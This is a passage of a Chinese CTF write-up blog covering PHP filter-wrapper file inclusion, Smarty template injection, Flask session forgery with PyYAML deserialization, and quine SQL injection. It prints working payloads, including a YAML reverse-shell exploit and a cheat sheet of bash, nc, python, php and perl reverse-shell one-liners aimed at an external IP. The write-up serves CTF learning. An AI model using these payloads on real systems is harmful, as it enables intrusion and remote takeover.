        <content type="html"><![CDATA[<p>[BSidesCF 2020]Had a bad day</p><span id="more"></span><p>打开抓包没有发现什么异常的东西，但是网站获取新页面方式有点奇怪，通过get传参取值来获取新内容，就联想到了伪协议。</p><p>直接试试flag.php</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677214256490-6f408795-207e-463c-bc26-534bf543cfd9.png" alt="img"></p><p>不行呢就试试index.php</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677214298541-98bada9c-dcc0-487c-ba35-bdcb23d1b86e.png" alt="img"></p><p>发现后台主动给我们加了.php后缀 </p><p>构造payload：<code>?category=php://filter/read=convert.base64-encode/resource=index</code></p><p>获得base64码解码得出源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">          &lt;?php</span><br><span class="line">$file = $_GET[&#x27;category&#x27;];</span><br><span class="line">    </span><br><span class="line">if(isset($file))</span><br><span class="line">&#123;</span><br><span class="line">if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">include ($file . &#x27;.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我们只能读取他规定的<code>woofers</code> <code>meowers</code> <code>index</code> 三个文件</p><p>看了别人的wp 又学到了新姿势 伪协议里面还可以再嵌套一层协议 加上他给的合法文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure><p><code>?category=php://filter/read=convert.base64-encode/resource=index/../flag</code> 两种方式都可以 学到了</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDCTF 2023(省内赛道)</title>
      <link href="/post/dd40690e.html"/>
      <url>/post/dd40690e.html</url>
      
        <content type="html"><![CDATA[<p>HDCTF 2023(省内赛道) 部分WP</p><span id="more"></span><p>最终排名第七吧 web狗表示web后面几道真的很难,目前刷题还没有做到后几道题目的类型，所以后半阶段真的在坐牢，还是太菜了，努力！！！</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165596340-28745076-d8ed-4e46-9793-4e5d6fe9aa23.png" alt="img"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Welcome-To-HDCTF-2023"><a href="#Welcome-To-HDCTF-2023" class="headerlink" title="Welcome To HDCTF 2023"></a>Welcome To HDCTF 2023</h2><h3 id="解一："><a href="#解一：" class="headerlink" title="解一："></a>解一：</h3><p>直接送死</p><h3 id="解二："><a href="#解二：" class="headerlink" title="解二："></a>解二：</h3><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165396401-dde8abd9-573b-46cd-ad8d-226bd51cf855.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165410073-d283c8aa-3c61-4053-b5df-999deea9f425.png" alt="img"></p><p>直接输入在console中输入seeeeeeeecret就能拿到</p><h2 id="SearchMaster"><a href="#SearchMaster" class="headerlink" title="SearchMaster"></a>SearchMaster</h2><p>这题拿了一血 开心qwq</p><p>一眼丁真 php的smarty注入</p><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;if system(&#x27;ls /&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">data=&#123;if system(&#x27;cat /flag_13_searchmaster&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165707395-5aedfc9c-7b33-4f5f-8cef-67275fe4f7ab.png" alt="img"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Normal-Rsa"><a href="#Normal-Rsa" class="headerlink" title="Normal_Rsa"></a>Normal_Rsa</h2><p>应该是题目出问题了 打开题目flag就有</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hardMisc"><a href="#hardMisc" class="headerlink" title="hardMisc"></a>hardMisc</h2><p>也是拿到一个一血</p><p>拖进010一把梭</p><p>末尾 base64解码拿到flag</p><h1 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h1><h2 id="YamiYami"><a href="#YamiYami" class="headerlink" title="YamiYami"></a>YamiYami</h2><p>一道关于session伪造 yaml(一开始一直在搜yami反序列化 还在想为什么搜不到相关文章 真该死啊我)反序列化 shell反弹的题目</p><p>借助这道题目好好学习一下yami漏洞和shell反弹</p><p>进入题目后能看到有三个路由 <code>/read</code>是用来读文件的 <code>/upload</code>是用来上传我们的恶意代码文件的 <code>/pwd </code>字面意思就是告诉我们当前在哪个文档中</p><p>当时做题的时候还以为这道题目难度应该不会很难 还以为是很基础的上传一句话木马去包含然后getshell 看了wp真的怀疑人生</p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>先说说非预期吧 直接读取环境变量就可以了 我当时也是这么想的 但是我纯脑瘫去读linux系统用户环境信息了</p><p>而且题目环境应该是在docker下</p><p>一开始一直在读<code>/etc/profile</code></p><p> <strong>&#x2F;etc&#x2F;profile：</strong> 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行. 并从&#x2F;etc&#x2F;profile.d目录的配置文件中搜集shell的设置。  </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514003165-ae5d5af3-b1fe-4857-b9c3-8749c4bd9f08.png" alt="img"></p><p>根本没什么用</p><p>应该读环境变量<code>/proc/1/environ</code>（详细可参考：<a href="https://blog.csdn.net/FY_2018/article/details/112986445%EF%BC%89">https://blog.csdn.net/FY_2018/article/details/112986445）</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514196676-0a40092c-feba-4e9c-b7db-48181e2efc24.png" alt="img"></p><h3 id="预期："><a href="#预期：" class="headerlink" title="预期："></a>预期：</h3><p>上传一个yami反序列化文件 然后反弹shell去打</p><p>首先先去读源文件 发现做flask的题目 能get到源代码就去努力！</p><p>这里用到了python3解析特性</p><p>如果直接构造payload<code>/read?url=file:///app.py</code> flag字样也被正则了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514715380-37099247-9a07-43a4-9cd2-067bfface208.png" alt="img"></p><p>发现是不行的 被过滤了</p><p>这里用到了python3的字符解析特性通过双重url编码（全字符）去绕过</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514739750-28c9e6f1-ebd3-4d0e-9735-7a158d95388d.png" alt="img"></p><p>拿到源码</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514766571-03f89872-a08b-47e5-b1e7-b90e9d3eeb92.png" alt="img"></p><p>源码：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line">import os</span><br><span class="line">import re, random, uuid</span><br><span class="line">from flask import *</span><br><span class="line">from werkzeug.utils import *</span><br><span class="line">import yaml</span><br><span class="line">from urllib.request import urlopen</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="keyword">False</span></span><br><span class="line">BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[&#x27;UPLOAD_FOLDER&#x27;]=<span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    session[&#x27;passport&#x27;] = &#x27;YamiYami&#x27;</span><br><span class="line">    <span class="keyword">return</span> &#x27;&#x27;&#x27;</span><br><span class="line">    Welcome to HDCTF2023 &lt;a href=<span class="string">&quot;/read?url=https://baidu.com&quot;</span>&gt;Read somethings&lt;/a&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    Here is the challenge &lt;a href=<span class="string">&quot;/upload&quot;</span>&gt;Upload <span class="keyword">file</span>&lt;/a&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    Enjoy it &lt;a href=<span class="string">&quot;/pwd&quot;</span>&gt;pwd&lt;/a&gt;</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">@app.route(&#x27;/pwd&#x27;)</span><br><span class="line">def pwd():</span><br><span class="line">    <span class="keyword">return</span> str(pwdpath)</span><br><span class="line">@app.route(&#x27;/read&#x27;)</span><br><span class="line">def read():</span><br><span class="line">    try:</span><br><span class="line">        url = request.args.get(&#x27;url&#x27;)</span><br><span class="line">        m = re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    except Exception as ex:</span><br><span class="line">        print(str(ex))</span><br><span class="line">    <span class="keyword">return</span> &#x27;no response&#x27;</span><br><span class="line"></span><br><span class="line">def allowed_file(filename):</span><br><span class="line">   for blackstr in BLACK_LIST:</span><br><span class="line">       <span class="keyword">if</span> blackstr in filename:</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    <span class="keyword">if</span> request.method == &#x27;POST&#x27;:</span><br><span class="line">        <span class="keyword">if</span> &#x27;<span class="keyword">file</span>&#x27; <span class="keyword">not</span> in request.files:</span><br><span class="line">            flash(&#x27;No <span class="keyword">file</span> part&#x27;)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        <span class="keyword">file</span> = request.files[&#x27;<span class="keyword">file</span>&#x27;]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">file</span>.filename == &#x27;&#x27;:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">file</span> <span class="keyword">and</span> allowed_file(<span class="keyword">file</span>.filename):</span><br><span class="line">            filename = secure_filename(<span class="keyword">file</span>.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.<span class="keyword">exists</span>(&#x27;./uploads/&#x27;):</span><br><span class="line">                os.makedirs(&#x27;./uploads/&#x27;)</span><br><span class="line">            <span class="keyword">file</span>.save(os.path.join(app.config[&#x27;UPLOAD_FOLDER&#x27;], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">@app.route(&#x27;/boogipop&#x27;)</span><br><span class="line">def load():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.<span class="keyword">exists</span>(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        with open(LoadedFile) as f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==&#x27;__main__&#x27;:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="keyword">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    print(app.config[&#x27;SECRET_KEY&#x27;])</span><br></pre></td></tr></table></figure><p>发现还有一个<code>/boogipop</code>路由</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/boogipop&#x27;)</span><br><span class="line">def load():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.<span class="keyword">exists</span>(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        with open(LoadedFile) as f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br></pre></td></tr></table></figure><p>当<code>session=&quot;Welcome To HDCTF2023&quot;</code>通过get方式去读文件 也就是说还需要session伪造 </p><p>伪造需要key 那么看源码是怎么生成的</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*<span class="number">233</span>)</span><br></pre></td></tr></table></figure><p>在 python 中使用 uuid 模块生成 UUID（通用唯一识别码）。可以使用 uuid.getnode() 方法来获取计算机的硬件地址，这个地址将作为 UUID 的一部分。  </p><p><code>/sys/class/net/eth0/address</code>，这个就是网卡的位置，读取他进行伪造  </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682516256550-09f531fb-105e-458e-b1d5-62edbda38d4b.png" alt="img"></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">random.seed(<span class="number">0</span>x0242ac024ed7) <span class="comment">#去掉：加上0x也就是十六进制</span></span><br><span class="line">print(str(random.random()*<span class="number">233</span>))</span><br></pre></td></tr></table></figure><p>得到key为<code>33.893457812509084</code></p><p>通过脚本伪造session</p><p>然后<code>yaml.full_load(f)</code>就是漏洞所在点他会将我们上传的恶意文件内容反序列化 并且代码中并没有回显的语句也暗示了这里要通过反弹shell的方式去打（这里参考这篇大佬的文章太细了 <a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/%EF%BC%89">https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/）</a></p><p>上传反序列化文件</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:str</span><br><span class="line">    args: []</span><br><span class="line">    <span class="comment"># 通过 state 触发调用</span></span><br><span class="line">    state: !!python/tuple</span><br><span class="line">      - <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/124.221.177.174/7777 &lt;&amp;1\&quot;&#x27;)&quot;</span><span class="comment">#这里就是代码执行 通过bash直接反弹shell </span></span><br><span class="line">      <span class="comment"># 下面构造 exp</span></span><br><span class="line">      - !!python/object/new:staticmethod</span><br><span class="line">        args: []</span><br><span class="line">        state: </span><br><span class="line">          update: !!python/name:eval</span><br><span class="line">          items: !!python/name:<span class="keyword">list</span>  <span class="comment"># 不设置这个也可以，会报错但也已经执行成功</span></span><br></pre></td></tr></table></figure><p>至于为什么上面大佬的文章讲的很仔细 我就不献丑了 自己太菜了</p><p>简单理解就是python将命令执行的代码塞入了对象中然后yaml序列化得到这个 然后再利用反序列化去命令执行 看起来比较奇怪是因为这种格式是属于yaml形式的序列化对象 所以看起来比较的陌生 还有就是这里的命令执行是用反弹shell 是因为通过看源码发现没有回显的代码 所以只能通过反弹shell去变相得到回显</p><p>然后将文件命名为2.txt 这里不能用<code>.yaml</code>后缀被屏蔽了</p><p>既然是txt后缀为什么代码会被执行呢</p><p>这里借用大佬的理解：</p><p>猜测可能是：这里full_load调用了load函数，而load函数输入的是一个steam,也就是流，二进<br>制文件，所以不管是什么后缀都无关紧要了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682518211036-422e9054-fb3e-4dd9-83ca-b93c288dc87a.png" alt="img"></p><p>上传上去</p><p>然后去<code>/boogipop</code>路由下去读取，然后反弹shell</p><p>这里文件路径是<code>uplaods/2.txt</code></p><p>大佬文章也提到了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517504048-653cd836-870e-46e6-93e7-ab8e3953106f.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517014776-8237fe1d-8919-406f-9912-cfc0abb2a08b.png" alt="img"></p><p>不要在意这里为什么bp报错 nc能连通就行</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517082099-b27ae5c2-2d34-4496-8e96-9155ecfc2a77.png" alt="img"></p><p>反弹shell成功</p><p>再来说说反弹shell</p><p>这里就说说我的理解，不会去将所有概念一字不漏的打出来，我觉得没必要，理解是最棒的，想看概念随时都可以百度，但是唯独理解是检测自己是否对于一个知识点真的理解了</p><p>我们一般主动攻击去连接某个电脑，叫做正向连接，一般知道这个电脑一些信息ip之类的，知道它何时在做什么</p><p>但是如果我们不知道这台电脑信息ip什么的，或者此时此刻的状态，就叫薛定谔状态吧（bushi，就没法去连接去攻击 那么应该怎么办呢？</p><p>这里就用到了反弹shell 何为反弹？</p><p>既然我们不知道对方的状态 但是我们知道我们的状态信息 我们可以提供我们自己的一些信息去让对方找到我们然后连接不就行了？</p><p>这里可以这么形象的比喻：</p><p>简单的说，就是我送了小明一份礼物，小明收到了，看见礼物里面写着xxx大街xxx户xxx号领取(木马)，小明去了敲门(打开木马，反弹shell)，我开门把他拉进来(netcat)，这样我就有了他的支配权，他的操作就被我控制了。</p><p>来自一个b站网友 我觉得很形象能理解反弹shell的概念</p><p>既然是对方找到我们，就需要用公网ip，我们物理机的ip都是一个局域网分配的，真实ip都掌握在运营商手里</p><p>这里就需要用到vps或者在大厂买云服务即可，当然也不影响我白嫖室友的云服务器:)</p><p>以上只是我浅薄的理解，可以参考这篇文章深入理解：<a href="https://xz.aliyun.com/t/9488">https://xz.aliyun.com/t/9488</a></p><p>然后我简单总结了一下一些常用的反弹shell的exp：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.nc</span><br><span class="line">netcat <span class="number">124.221</span>.<span class="number">177.174</span> <span class="number">7777</span> -e /bin/bash</span><br><span class="line"><span class="number">2</span>.bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">124.221</span>.<span class="number">177.174</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="number">3</span>.Telnet:</span><br><span class="line">mknod a p; telnet <span class="number">124.221</span>.<span class="number">177.174</span> <span class="number">7777</span> <span class="number">0</span>&lt;a | /bin/bash <span class="number">1</span>&gt;a</span><br><span class="line"><span class="number">4</span>.python:</span><br><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;124.221.177.174&quot;</span>,<span class="number">7777</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br><span class="line"><span class="number">5</span>.php</span><br><span class="line">php -r &#x27;$sock=fsockopen(<span class="string">&quot;124.221.177.174&quot;</span>,<span class="number">7777</span>);exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line"><span class="number">6</span>.perl:</span><br><span class="line">perl -e &#x27;use Socket;$i=<span class="string">&quot;124.221.177.174&quot;</span>;$p=<span class="number">7777</span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);open(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);open(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);exec(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span><br><span class="line"><span class="number">7</span>.sh</span><br><span class="line">nc <span class="number">124.221</span>.<span class="number">177.174</span> <span class="number">7777</span> -e /bin/sh</span><br></pre></td></tr></table></figure><p>回到题目，发现没有关于flag的文件，所以还是通过读取环境变量来读flag，结束。</p><h2 id="LoginMaster"><a href="#LoginMaster" class="headerlink" title="LoginMaster"></a>LoginMaster</h2><p>这道题 我的评价是寄，刷题没刷到过这样的注入——quine注入，还有时间盲注也还没有开始学借助此次机会学习学习</p><p>首先日常先看<code>/robots.txt</code>发现了waf</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682570503152-ae120381-50eb-43c4-9634-a47cff72b0f9.png" alt="img"></p><p>看到waf后我就陷入了沉思，我能想到的payload所包含的几乎都河蟹了个遍，这还怎么玩，就放弃了</p><p>看了wp要用时间盲注和quine组合拳去打</p><p>其实看了waf 这段代码也大概能感觉到是quine注入 </p><p>这里就是需要我们输入的密码与查询到的密码相等 </p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class="line">        die($FLAG);</span><br></pre></td></tr></table></figure><p>说简单一点，quine注入就是输入与输出完全相同 自产生程序也就是说就是输入的sql语句与要输出的一致  </p><p>用到replace()函数</p><p>如果输入 <code>replace(&quot;.&quot;,char(46),&quot;.&quot;) </code> </p><p>则会输出 <code>.</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682596804773-43900a23-f1bb-4f21-bd92-1258a4af3700.png" alt="img"></p><p>如果输入  <code>replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;) </code> </p><p>则会用第三个参数去替换第一个参数中的所有<code>.</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682596879463-3e74e07c-7f75-48f1-92e4-69d21e9d6a21.png" alt="img"></p><p>但是此时就会发现一个问题 我们输入与输出并不是完全相同的</p><p>我们输入的单引号在输出语句里都是双引号</p><p>因此 需要在repalce里面再嵌套一个replace来让双引号转成单引号  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682597458239-a1bc5eba-19bd-4464-afe0-f5582b6f9c02.png" alt="img"></p><p>用上面的式子替换所有的<code>.</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;)</span><br></pre></td></tr></table></figure><p>就会发现输入与输出完全相等</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682597557792-2a8afbc9-a8a2-4de8-a340-a3415d2e2d08.png" alt="img"></p><p> 回到题目 因为屏蔽了空格用<code>()</code>嵌套或者<code>/**/</code>绕过都行</p><p>payload:<code>1&#39;UNION(SELECT(REPLACE(REPLACE(&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;,CHAR(34),CHAR(39)),CHAR(37),&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;)))#</code></p><p>分析：</p><p><code>1&#39;UNION(SELECT(REPLACE(A,CHAR(37),B)))</code>  用B替换%,%这个符号应该是任意的后续替换时变成相应的char就行</p><p><code>A:REPLACE(&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;,CHAR(34),CHAR(39))</code>  双引号换为单引号-&gt;替换%-&gt;双引号换为单引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 